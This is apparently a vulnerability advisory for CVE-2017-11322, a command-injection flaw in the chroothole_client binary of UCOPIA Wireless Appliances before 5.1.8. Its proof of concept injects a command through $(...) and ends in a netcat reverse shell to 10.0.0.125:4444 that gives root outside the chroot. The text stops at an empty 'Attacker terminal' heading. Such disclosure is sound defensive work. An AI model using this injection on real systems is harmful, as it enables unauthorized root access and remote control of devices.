## Vulnerability

CHROOT escape and privileges escalation.

**Threat**

Improper sanitization of system commands in the chroothole_client executable in UCOPIA Wireless Appliance, prior to 5.1.8, allows local attackers to elevate privileges to root user and escape from the *chroot*.

**CVE ID**: CVE-2017-11322

**Access Vector**: local

**Security Risk**: high

**Vulnerability**: CWE-78

**CVSS Base Score**: 8.2 (High)

**CVSS Vector**: CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

### Proof of Concept: chroot escape / privileges escalation

The **chroothole_client** binary is used by the appliance to run programs outside the *chroot*, as the **root** user.

Because of an improper sanitization of system commands, we managed to gain a complete **root** access to the appliance, outside the *chroot*.

```
$ chroothole_client &#039;/usr/sbin/status&#039;
is not running ... failed !
$ chroothole_client &#039;/usr/sbin/status $(which nc)&#039;
/bin/nc is not running ... failed!
$ chroothole_client &#039;/usr/sbin/status $(nc 10.0.0.125 4444 -e /bin/sh)&#039;
```

Attacker terminal :
